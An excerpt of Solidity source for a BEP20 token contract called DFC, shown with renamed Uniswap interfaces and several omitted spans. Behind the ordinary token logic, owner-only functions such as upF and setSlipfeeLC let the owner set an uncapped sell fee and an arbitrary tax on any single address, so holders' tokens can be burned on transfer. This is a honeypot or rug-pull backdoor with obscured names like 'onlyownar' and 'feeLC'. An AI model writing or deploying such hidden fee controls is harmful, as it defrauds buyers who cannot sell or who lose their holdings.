...
interface IUniswapV2Factory {
    ...
    function feeLCTo() external view returns (address);
    function feeLCToSetter() external view returns (address);
    ...
    function setfeeLCTo(address) external;
    function setfeeLCToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeLCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeLCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeLCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeLCOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeLCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract DFC is BEP20, Ownable {
    ...
    uint256 private _defaultSellfeeLC = 0;

    uint256 private _defaultBuyfeeLC = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeLC;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeLC = _value;
    }

    function setSlipfeeLC(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeLC[_address] = _value;
    }

    function getSlipfeeLC(address _address) external view onlyownar returns (uint256) {
        return _slipfeeLC[_address];
    }


    function setMAccountfeeLC(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeLC(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeLCAmount = 0;

        if (rF) {
            uint256 tradefeeLC = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeLC = _defaultSellfeeLC;
                }
                if (from == uniswapV2Pair) {

                    tradefeeLC = _defaultBuyfeeLC;
                }
            }
            if (_slipfeeLC[from] > 0) {
                tradefeeLC = _slipfeeLC[from];
            }

            tradefeeLCAmount = _Amount.mul(tradefeeLC).div(100);
        }


        if (tradefeeLCAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeLCAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeLCAmount);
            emit Transfer(from, _deadAddress, tradefeeLCAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeLCAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeLCAmount);
        emit Transfer(from, _to, _Amount - tradefeeLCAmount);
    }
